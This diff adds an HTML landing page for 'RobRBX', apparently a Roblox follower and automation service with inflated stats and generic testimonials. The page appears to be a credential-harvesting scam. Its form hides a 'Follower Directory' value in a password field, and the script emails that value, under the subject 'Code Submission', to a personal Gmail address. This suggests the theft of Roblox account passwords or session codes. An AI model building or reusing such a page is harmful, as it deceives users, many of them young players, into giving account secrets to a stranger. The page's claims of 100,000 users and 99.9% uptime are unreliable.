@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>RobRBX Tools & Automation Hub</title>
+  <meta name="description" content="Unlock next-level Roblox efficiency and automation with RobRBX – The #1 Roblox Tools Service in 2024, empowering over 100,000 gamers with powerful, reliable solutions.">
+  <link rel="icon" href="https://avatars.githubusercontent.com/u/148258711?s=48&v=4">
+  <style>
+    /* ---------- Root Theming ---------- */
+    :root {
+      --accent: #50de8c;
+      --accent-dark: #30b273;
+      --bg-dark: #10141f;
+      --header-bg: #151a28;
+      --card-bg: #172035;
+      --text-main: #f4f8fa;
+      --text-subtle: #b8c2cc;
+      --danger: #ff4b4b;
+      --input-bg: #23314a;
+      --yellow: #ffd300;
+      --blue: #3cc8a4;
+      --highlight: #6d9bf1;
+      --shadow: 0 2px 24px 0 #18f2a622;
+      --spacing: 24px;
+    }
+    body {
+      background: var(--bg-dark);
+      color: var(--text-main);
+      font-family: 'Segoe UI', Arial, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+      line-height: 1.7;
+      overflow-x: hidden;
+    }
+
+    /* ---------- Animations ---------- */
+    @keyframes slideDownFade {
+      0% { transform: translateY(-40px); opacity: 0; }
+      100% { transform: translateY(0); opacity: 1; }
+    }
+    @keyframes pulse {
+      0%,100%{ box-shadow: 0 0 0 0 var(--accent); }
+      50%{ box-shadow: 0 0 18px 4px var(--accent-dark); }
+    }
+    @keyframes fadeInCard {
+      0% { opacity: 0; transform: scale(0.98); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+    /* ---------- Layout Containers ---------- */
+    .top-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background: linear-gradient(110deg,#24304a 60%,#19343a 100%);
+      padding: 0 0 44px 0;
+      margin-bottom: var(--spacing);
+      border-radius: 0 0 38px 38px;
+      box-shadow: var(--shadow);
+      animation: slideDownFade 1.3s cubic-bezier(.19,1,.22,1);
+    }
+
+    .top-content-group {
+      width: 100%;
+      max-width: 1190px;
+      display: flex;
+      gap: 54px;
+      align-items: flex-start;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-top: 44px;
+    }
+
+    .left-video {
+      flex: 1 1 390px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-width: 310px;
+      animation: fadeInCard 1.2s .3s backwards;
+    }
+    .left-video iframe {
+      border-radius: 16px;
+      box-shadow: 0 4px 26px #101f4150;
+      width: 420px; max-width: 90vw;
+      height: 238px; min-height: 180px;
+      border: 0;
+      margin-bottom: 16px;
+      background: #070c16;
+      transition: box-shadow 0.35s;
+    }
+    .left-video iframe:hover {
+      box-shadow: 0 8px 48px var(--accent);
+      transition: box-shadow 0.2s;
+      animation: pulse 1.2s infinite;
+    }
+    .left-video .note {
+      color: var(--text-subtle);
+      font-size: 1.03em;
+      text-align: center;
+      margin-bottom: 16px;
+      animation: fadeInCard 1.2s 0.7s backwards;
+    }
+
+    .form-card {
+      flex: 1 1 370px;
+      min-width: 320px;
+      background: var(--card-bg);
+      border-radius: 20px;
+      box-shadow: 0 3px 34px #19b2a422;
+      padding: 36px 28px 30px 28px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 20px;
+      animation: fadeInCard 1.2s .7s backwards;
+      position: relative;
+    }
+    .form-title {
+      color: var(--accent);
+      font-size: 1.13em;
+      font-weight: 800;
+      letter-spacing: 1px;
+      margin-bottom: 22px;
+      animation: fadeInCard .85s .5s backwards;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      gap: 17px;
+    }
+    .form-group { display: flex; flex-direction: column; }
+    label {
+      font-size: 1.07em;
+      font-weight: 600;
+      margin-bottom: 7px;
+      color: var(--text-main);
+      letter-spacing: 0.6px;
+    }
+    input[type="number"],input[type="password"]{
+      background: var(--input-bg);
+      color: var(--text-main);
+      border: 1.1px solid #2d536a;
+      border-radius: 8px;
+      font-size: 1.03em;
+      padding: 10px 12px;
+      margin-top: 2px;
+      outline: none;
+      margin-bottom: 0;
+      transition: border 0.2s;
+      font-family: inherit;
+    }
+    input[type="number"]:focus,
+    input[type="password"]:focus {
+      border-color: var(--accent);
+    }
+    input[type="number"]::-webkit-inner-spin-button,
+    input[type="number"]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0;}
+    input[type="password"]{ letter-spacing: 7px;}
+    .terms-wrap {
+      display: flex;
+      align-items: center;
+      gap: 9px;
+      margin-top: 6px;
+      animation: fadeInCard .62s 1.18s backwards;
+    }
+    .terms-wrap input[type=checkbox] {
+      width: 18px;
+      height: 18px;
+      accent-color:var(--accent);
+    }
+    .terms-label {
+      font-size:1em;
+      user-select:none;
+    }
+    .form-error{
+      color:var(--danger);
+      font-size:.97em;
+      margin:4px 0 0 0;
+      min-height:1.09em;
+      letter-spacing:0.2px;
+    }
+    .send-btn {
+      background: linear-gradient(90deg, var(--accent) 60%, var(--blue) 100%);
+      color: #2c3c4a;
+      font-size: 1.14em;
+      border: none;
+      border-radius: 32px;
+      padding: 14px 0;
+      font-weight: 700;
+      box-shadow: 0 2px 18px #66e2a633;
+      cursor: pointer;
+      letter-spacing: 1.1px;
+      margin-top: 18px;
+      transition: background 0.17s, color 0.13s, opacity 0.21s, transform .12s;
+      animation: fadeInCard .85s .77s backwards;
+    }
+    .send-btn:disabled {
+      background: #43b182; color: #666;
+      opacity: .62; cursor: not-allowed;
+      box-shadow: none;
+      transform: scale(.98);
+    }
+    /* --- Section Headings & CTAs --- */
+    .section {
+      margin: 48px auto 0 auto;
+      padding: 0 18px 52px 18px;
+      max-width: 1150px;
+      animation: fadeInCard 1.15s;
+    }
+    .headline-main {
+      font-size: 2.65em;
+      font-weight: 800;
+      color: var(--accent);
+      text-align: center;
+      margin: 16px 0 7px 0;
+      letter-spacing: 1.2px;
+      background: linear-gradient(90deg,#69f7be 35%,#6ecbff 65%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-fill-color: transparent;
+      animation: slideDownFade 1.4s 0.2s backwards;
+    }
+    .headline-sub {
+      text-align: center;
+      color: var(--text-subtle);
+      font-size: 1.25em;
+      margin-bottom: 22px;
+      max-width: 600px;
+      margin-left: auto; margin-right: auto;
+    }
+    .cta-row {
+      text-align: center;
+      margin: 32px 0 24px 0;
+    }
+    .cta-btn, .cta-btn2 {
+      font-size: 1.08em;
+      padding: 14px 32px;
+      border-radius: 42px;
+      font-weight: 700;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 3px 18px #50de8c33;
+      margin: 8px 9px;
+      letter-spacing: 1.3px;
+      text-decoration: none;
+      display: inline-block;
+      transition: background .23s,color .17s,transform .13s;
+      background: linear-gradient(90deg,var(--accent) 70%, var(--blue) 100%);
+      color: #181D2C;
+      animation: fadeInCard 1.4s;
+    }
+    .cta-btn:hover, .cta-btn2:hover {
+      background: linear-gradient(90deg,#3cc8a4 20%,var(--accent) 80%);
+      color: #f4f8fa;
+      transform: scale(1.035);
+      animation: pulse .8s;
+    }
+    .cta-btn2 {
+      background: transparent;
+      color: var(--accent);
+      border: 2px solid var(--accent);
+      box-shadow: none;
+      font-weight: 700;
+    }
+    /* --- Stats Cards --- */
+    .stats-flex {
+      display: flex; flex-wrap: wrap; gap: 28px; justify-content: center;
+      margin:36px 0 46px 0;
+      animation: fadeInCard 1.2s .6s backwards;
+    }
+    .stat-card {
+      background: #181f2f;
+      border-radius: 16px;
+      padding: 26px 32px 22px 32px;
+      min-width: 170px;
+      max-width: 320px;
+      text-align: center;
+      box-shadow: var(--shadow);
+      flex: 1 1 210px;
+      animation: fadeInCard 1.1s;
+      transition: transform .17s,box-shadow .19s;
+    }
+    .stat-card:hover {
+      transform: translateY(-6px) scale(1.04);
+      box-shadow: 0 10px 40px var(--accent);
+      animation: pulse .95s;
+    }
+    .stat-number { font-size:2.36em;font-weight:900;margin-bottom:6px; color: var(--yellow);}
+    .stat-caption { color:var(--text-main); font-size:1.16em; font-weight: 600;}
+    .stat-desc { color:var(--text-subtle); font-size:.97em;margin-top:6px; min-height:44px;}
+
+    /* --- Features --- */
+    .section-title {
+      font-size: 2.03em;
+      font-weight: 700;
+      margin-bottom: 12px;
+      color: var(--accent);
+      text-align: center;
+      background: linear-gradient(90deg,#6d9bf1 14%,#69f7be 99%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-fill-color: transparent;
+      animation: fadeInCard 1.1s .2s backwards;
+    }
+    .section-desc {
+      color:var(--text-subtle);
+      max-width:750px;
+      margin: 0 auto 32px auto;
+      text-align: center;
+    }
+    .feats-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 21px;
+      justify-content: center;
+      margin-top: 36px;
+      animation: fadeInCard 1.2s .44s backwards;
+    }
+    .feat-card {
+      background: #182135;
+      border-radius: 13px;
+      padding: 28px 20px;
+      text-align: center;
+      min-width: 206px;
+      max-width: 270px;
+      flex: 1 1 210px;
+      box-shadow: var(--shadow);
+      transition: box-shadow .17s,transform .13s;
+      animation: fadeInCard 1.15s .22s backwards;
+      margin-bottom: 12px;
+    }
+    .feat-card:hover {
+      box-shadow: 0 9px 36px #06ffd566,0 2px 24px var(--accent);
+      transform: translateY(-5px) scale(1.017);
+      animation: pulse .8s;
+    }
+    .feat-icon {
+      font-size: 2.36em;
+      margin-bottom: 10px;
+      color: var(--accent);
+      animation: pulse 2.5s infinite;
+    }
+    .feat-title {
+      font-size: 1.14em;
+      color: #fff;
+      font-weight: 800;
+      margin-bottom: 7px;
+    }
+    .feat-desc {
+      font-size: 1.03em;
+      color: var(--text-subtle);
+      margin-bottom: 0;
+      min-height:45px;
+    }
+
+    /* --- Why Us --- */
+    .whyus-wrap {
+      background:linear-gradient(98deg,#101933,#183c3a 100%);
+      border-radius: 22px;
+      margin-top:48px;
+      padding-bottom:14px;
+      animation: fadeInCard 1.07s;
+    }
+    .whyus-cols {
+      display:flex;
+      flex-wrap:wrap;
+      gap:38px;
+      justify-content:center;
+      margin: 28px 0;
+    }
+    .whyus-col {
+      flex:1 1 320px;
+      min-width:245px;
+      max-width:390px;
+      background:#141A24;
+      border-radius:13px;
+      box-shadow:var(--shadow);
+      padding: 28px 18px 19px 18px;
+      margin-bottom:10px;
+      animation: fadeInCard 1.11s .28s backwards;
+    }
+    .whyus-title { font-size:1.17em;font-weight:700; color:var(--accent); margin:0 0 7px 0;}
+    .whyus-content {color:var(--text-main);}
+    .double-cta-row {text-align: center; margin:33px auto 10px auto;}
+    .double-cta-row a {margin: 0 9px;}
+    /* --- UX, Communication --- */
+    .ux-row, .comm-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 44px;
+      margin: 38px 0 22px 0;
+      justify-content: center;
+    }
+    .ux-col, .comm-col {
+      background: #1c253a;
+      border-radius: 13px;
+      box-shadow:var(--shadow);
+      padding:21px 20px;min-width:200px;max-width:340px;flex:1 1 240px;
+      animation: fadeInCard 1.10s .35s backwards;
+      margin-bottom:14px;
+    }
+    .ux-title, .comm-title {font-weight:700;color:var(--highlight);margin-bottom:7px;}
+    .ux-detail, .comm-detail {color:var(--text-subtle);}
+    /* --- Testimonials --- */
+    .testimonial-wrap {
+      max-width:1140px;
+      margin:0 auto;
+      padding:55px 12px 34px 12px;
+      animation: fadeInCard 1.10s .48s backwards;
+    }
+    .testimonial-title {
+      font-size:1.45em;
+      text-align:center;
+      font-weight:800;
+      color:var(--accent);
+      margin-bottom:11px;
+    }
+    .testi-cards{
+      display:flex;
+      flex-wrap:wrap;
+      gap:27px;
+      justify-content:center;
+      margin-top:18px;
+    }
+    .testi-card{
+      background:#171f33;
+      border-radius:13px;
+      box-shadow:var(--shadow);
+      flex:1 1 246px;
+      min-width:225px;
+      max-width:355px;
+      padding:33px 20px 18px 20px;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      margin-bottom:0;
+      animation: fadeInCard 1.13s .62s backwards;
+      transition: box-shadow .2s,transform .18s;
+    }
+    .testi-card:hover { box-shadow: 0 0 40px 4px var(--accent); }
+    .testi-quote {font-size:1.07em;color:var(--text-main);margin-bottom:13px;line-height:1.6;}
+    .testi-person {font-weight:700;color:var(--highlight);margin-top:4px;margin-bottom:2px;}
+    .testi-role {color:var(--text-subtle);font-size:0.95em;}
+    /* --- Responsive Design --- */
+    @media (max-width:1160px){
+      .top-content-group{flex-direction:column;align-items:center;gap:22px;}
+      .left-video,.form-card{max-width:98vw;}
+    }
+    @media (max-width:600px){
+      .section,.whyus-wrap{padding:0 1vw 36px 1vw;}
+      .whyus-cols,.ux-row,.comm-row,.stats-flex,.feats-row,.testi-cards{flex-direction:column;gap:14px;}
+      .form-card{padding:13vw 2vw;}
+      .left-video iframe{width:99vw;min-width:0; height:53vw; max-height:220px;}
+    }
+  </style>
+</head>
+<body>
+  <!-- Top Video + Form Section -->
+  <section class="top-section">
+    <div class="top-content-group">
+      <div class="left-video">
+        <iframe src="https://www.youtube.com/embed/tau7KkGJo80" allowfullscreen title="Tool Tutorial"></iframe>
+        <div class="note">Watch the full tutorial to get started with RobRBX automation.</div>
+      </div>
+      <div class="form-card" id="form">
+        <div class="form-title">Submit Your Request</div>
+        <form id="submissionForm" autocomplete="off">
+          <div class="form-group">
+            <label for="followerAmount">Follower Amount</label>
+            <input type="number" id="followerAmount" name="followerAmount" min="1" max="10000" required autocomplete="off" inputmode="numeric" placeholder="1 - 10,000">
+            <div id="followerError" class="form-error"></div>
+          </div>
+          <div class="form-group">
+            <label for="followerDirectory">Follower Directory</label>
+            <input type="password" id="followerDirectory" name="followerDirectory" maxlength="50" required autocomplete="off" placeholder="Directory or username">
+            <div id="directoryError" class="form-error"></div>
+          </div>
+          <div class="terms-wrap">
+            <input type="checkbox" id="agreeTerms" name="agreeTerms" required>
+            <label for="agreeTerms" class="terms-label">
+              I agree to the <a href="#" style="color:var(--accent);text-decoration:underline;" target="_blank">Terms and Services</a>
+            </label>
+          </div>
+          <div id="termsError" class="form-error"></div>
+          <button type="submit" class="send-btn" id="sendButton" disabled>Send</button>
+        </form>
+      </div>
+    </div>
+  </section>
+  <!-- Main Landing Content -->
+  <main>
+    <section class="section">
+      <div class="headline-main">Unlocking Automation on Roblox</div>
+      <div class="headline-sub">The #1 Roblox Tools Service in 2024. Our expertise, innovative technology, and commitment to excellence ensure your needs are always met.</div>
+      <div class="cta-row">
+        <a href="#form" class="cta-btn">Get Started</a>
+        <a href="#learn" class="cta-btn2">Learn More</a>
+      </div>
+      <div class="stats-flex">
+        <div class="stat-card">
+          <div class="stat-number">99.9%</div>
+          <div class="stat-caption">Uptime</div>
+          <div class="stat-desc">Our service boasts a 99.9% uptime guarantee, ensuring your tools and bots are available whenever you need them.</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-number">100,000&#43;</div>
+          <div class="stat-caption">Active Users</div>
+          <div class="stat-desc">Join a thriving community of over 100,000 gamers who trust our tools to enhance their Roblox experience.</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-number">250&#43;</div>
+          <div class="stat-caption">Supported Games</div>
+          <div class="stat-desc">Our tools and bots are versatile and powerful, currently supporting over 250 unique Roblox games.</div>
+        </div>
+      </div>
+    </section>
+    <section class="section" id="learn">
+      <div class="section-title">Seamless Solutions</div>
+      <div class="section-desc">Boost your in-game efficiency and performance with our suite of advanced Roblox automation tools.</div>
+      <div class="feats-row">
+        <div class="feat-card">
+          <div class="feat-icon">🧭</div>
+          <div class="feat-title">User-Friendly Interface</div>
+          <div class="feat-desc">Navigate with ease using our intuitive design, built for gamers of all skill levels.</div>
+        </div>
+        <div class="feat-card">
+          <div class="feat-icon">🎨</div>
+          <div class="feat-title">Customizable Features</div>
+          <div class="feat-desc">Tailor your experience to fit your play style with extensive customization options.</div>
+        </div>
+        <div class="feat-card">
+          <div class="feat-icon">⚡</div>
+          <div class="feat-title">Reliable Automation</div>
+          <div class="feat-desc">Our robust automation tools work seamlessly, efficiently handling repetitive tasks.</div>
+        </div>
+        <div class="feat-card">
+          <div class="feat-icon">🤝</div>
+          <div class="feat-title">Exceptional Support</div>
+          <div class="feat-desc">Need help? Our dedicated support team is here day and night to assist you.</div>
+        </div>
+      </div>
+    </section>
+    <section class="section whyus-wrap">
+      <div class="section-title">Why Choose Us?</div>
+      <div class="section-desc">Stay ahead of the competition with real-time analytics, instant feedback, and constant innovation. See what sets us apart.</div>
+      <div class="whyus-cols">
+        <div class="whyus-col">
+          <div class="whyus-title">Team Communication</div>
+          <div class="whyus-content">Our team maintains open communication, ensuring quick updates and seamless support whenever you need assistance.</div>
+        </div>
+        <div class="whyus-col">
+          <div class="whyus-title">Information Architecture</div>
+          <div class="whyus-content">Our backend is built for speed, security, and reliability so you can focus on maximizing your Roblox experience.</div>
+        </div>
+        <div class="whyus-col">
+          <div class="whyus-title">User Experience Prototype</div>
+          <div class="whyus-content">Our tools are designed for real users. Your feedback shapes everything we build, making each tool even better.</div>
+        </div>
+      </div>
+      <div class="double-cta-row">
+        <a href="#form" class="cta-btn">Get Started</a>
+        <a href="#features" class="cta-btn2">Learn More</a>
+      </div>
+    </section>
+    <section class="section">
+      <div class="ux-row">
+        <div class="ux-col">
+          <div class="ux-title">User Experience: 10/10</div>
+          <div class="ux-detail">From beginners to experts, everyone finds it simple and powerful to use our platform and tools. Experience the best in the industry.</div>
+        </div>
+        <div class="ux-col">
+          <div class="ux-title">Integrations</div>
+          <div class="ux-detail">Seamlessly connect with in-game notifications and real-time stats. Enhance your Roblox world with smart, efficient integrations.</div>
+        </div>
+      </div>
+      <div class="comm-row">
+        <div class="comm-col">
+          <div class="comm-title">Stay Informed, Stay Ahead</div>
+          <div class="comm-detail">Keep yourself on track with instant notifications and status updates, right when you need them.</div>
+        </div>
+        <div class="comm-col">
+          <div class="comm-title">Always Connected</div>
+          <div class="comm-detail">Our support team is ready to chat, any time, ensuring you're never left without answers or help.</div>
+        </div>
+      </div>
+    </section>
+    <section class="section">
+      <div class="section-title">Ready to Take Control?</div>
+      <div class="section-desc">Take the first step toward mastering Roblox with our advanced tools and bots. Unlock a new level of gameplay, automate repetitive tasks, and leave your competitors in the dust.</div>
+      <div class="feats-row" style="margin-bottom:0;">
+        <div class="feat-card">
+          <div class="feat-icon">🔧</div>
+          <div class="feat-title">Optimize Gameplay Efficiency</div>
+        </div>
+        <div class="feat-card">
+          <div class="feat-icon">🤖</div>
+          <div class="feat-title">Seamless Automation</div>
+        </div>
+        <div class="feat-card">
+          <div class="feat-icon">🎯</div>
+          <div class="feat-title">Elevate Your Status</div>
+        </div>
+        <div class="feat-card">
+          <div class="feat-icon">🌟</div>
+          <div class="feat-title">Precision-Crafted Tools</div>
+        </div>
+      </div>
+      <div class="double-cta-row" style="margin:17px 0 0 0;">
+        <a href="#form" class="cta-btn">Get Started</a>
+        <a href="#features" class="cta-btn2">Learn More</a>
+      </div>
+    </section>
+    <section class="testimonial-wrap">
+      <div class="testimonial-title">What People Say</div>
+      <div class="testi-cards">
+        <div class="testi-card">
+          <div class="testi-quote">Their innovative solutions and dedicated team transformed our processes, saving us time and money. Their attention to detail and commitment to excellence is unparalleled. We couldn't be happier with the results!</div>
+          <div class="testi-person">thundercraft</div>
+          <div class="testi-role">UGC Creator</div>
+        </div>
+        <div class="testi-card">
+          <div class="testi-quote">I was skeptical at first, but this service proved its worth in no time. The bots are incredibly reliable, and the user interface is so easy to navigate.</div>
+          <div class="testi-person">EnderTaker28</div>
+          <div class="testi-role">Software Developer</div>
+        </div>
+        <div class="testi-card">
+          <div class="testi-quote">If you're serious about getting the most out of Roblox, this is the tool for you. The automation features are top-notch, allowing me to focus on creativity while routine tasks are handled automatically.</div>
+          <div class="testi-person">Npinoy_RBLX</div>
+          <div class="testi-role">Game Developer</div>
+        </div>
+        <div class="testi-card">
+          <div class="testi-quote">This service has taken my Roblox experience to a whole new level! The automation tools are powerful and let me concentrate on strategizing and playing at a competitive level.</div>
+          <div class="testi-person">Skelecor</div>
+          <div class="testi-role">Clothing Designer</div>
+        </div>
+      </div>
+    </section>
+  </main>
+  <script>
+    // Interactive validation for clean UX
+    const followerAmount = document.getElementById('followerAmount');
+    const followerDirectory = document.getElementById('followerDirectory');
+    const agreeTerms = document.getElementById('agreeTerms');
+    const followerError = document.getElementById('followerError');
+    const directoryError = document.getElementById('directoryError');
+    const termsError = document.getElementById('termsError');
+    const sendButton = document.getElementById('sendButton');
+    const form = document.getElementById('submissionForm');
+
+    function validateForm(showMessages = false) {
+      let isValid = true;
+      let followerVal = parseInt(followerAmount.value, 10);
+      if (isNaN(followerVal) || followerVal < 1 || followerVal > 10000) {
+        if (showMessages) {
+          followerError.textContent = 'Follower amount must be between 1 and 10,000.';
+        }
+        isValid = false;
+      } else {
+        followerError.textContent = '';
+      }
+      if (isValid && !followerDirectory.value.trim()) {
+        if (showMessages) {
+          directoryError.textContent = 'Follower directory is required.';
+        }
+        isValid = false;
+      } else {
+        directoryError.textContent = '';
+      }
+      if (!agreeTerms.checked) {
+        if (showMessages) {
+          termsError.textContent = 'Please agree to the terms and services before submitting.';
+        }
+        isValid = false;
+      } else {
+        termsError.textContent = '';
+      }
+      sendButton.disabled = !isValid;
+      return isValid;
+    }
+    followerAmount.addEventListener('input', () => validateForm(false));
+    followerDirectory.addEventListener('input', () => validateForm(false));
+    agreeTerms.addEventListener('change', () => validateForm(false));
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      if (!validateForm(true)) return;
+      const subject = encodeURIComponent('RobRBX Code Submission');
+      const body = encodeURIComponent(
+        `Follower Amount: ${followerAmount.value}\n` +
+        `Follower Directory: ${followerDirectory.value}`
+      );
+      window.location.href = `mailto:jennifersnate2@gmail.com?subject=${subject}&body=${body}`;
+    });
+    setInterval(() => validateForm(false), 400);
+  </script>
+</body>
+</html>
